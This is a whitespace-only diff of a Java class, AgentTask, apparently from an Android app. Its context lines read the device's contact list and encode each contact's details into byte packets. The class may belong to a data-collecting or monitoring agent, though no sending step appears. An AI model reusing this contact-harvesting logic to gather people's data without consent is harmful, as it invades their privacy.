@@ -78,7 +78,6 @@ public class AgentTask extends AgentBase {
 		if (contacts == null) {
 			contacts = new HashMap<Long, Long>();
 			serializeContacts();
-
 		}
 	}
 
@@ -103,11 +102,13 @@ public class AgentTask extends AgentBase {
 	@Override
 	public void go() {
 		contact = new PickContact();
+
 		Date before = new Date();
 		List<Contact> list = contact.getContactInfo();
 		Date after = new Date();
 		Log.d("QZ", TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);
 		Log.d("QZ", TAG + " (go): list size = " + list.size());
+
 		ListIterator<Contact> iter = list.listIterator();
 
 		boolean needToSerialize = false;
@@ -159,7 +160,6 @@ public class AgentTask extends AgentBase {
 	 * @return
 	 */
 	private byte[] preparePacket(Contact c) {
-
 		UserInfo user = c.getUserInfo();
 		//List<EmailInfo> email = c.getEmailInfo();
 		//List<PostalAddressInfo> paInfo = c.getPaInfo();
@@ -206,15 +206,14 @@ public class AgentTask extends AgentBase {
 	private void addTypedString(ByteArrayOutputStream outputStream, byte type, String name) {
 		if (name != null && name.length() > 0) {
 			final int header = (type << 24) | (name.length() * 2);
+			
 			try {
 				outputStream.write(Utils.intToByteArray(header));
 				outputStream.write(WChar.getBytes(name, false));
 			} catch (IOException e) {
-
 				e.printStackTrace();
 				Log.d("QZ", TAG + " Error (addTypedString): " + e);
 			}
-
 		}
 	}
 
